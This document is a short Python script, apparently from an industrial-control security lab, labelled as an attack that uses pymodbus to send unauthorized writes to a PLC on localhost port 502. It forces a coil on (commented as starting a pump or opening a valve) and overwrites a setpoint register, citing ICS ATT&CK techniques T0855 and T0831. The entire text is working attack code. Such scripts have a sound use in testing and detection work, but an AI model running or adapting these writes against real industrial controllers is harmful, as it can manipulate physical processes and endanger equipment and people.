#!/usr/bin/env python3
# ATTACK: unauthorized writes to the PLC (T0855 / T0831)
from pymodbus.client import ModbusTcpClient
c = ModbusTcpClient("127.0.0.1", port=502); c.connect()
c.write_coil(1, True)        # FC5 force coil ON (start pump/open valve)
c.write_register(0, 9999)    # FC6 overwrite a setpoint
c.close(); print("unauthorized writes sent")
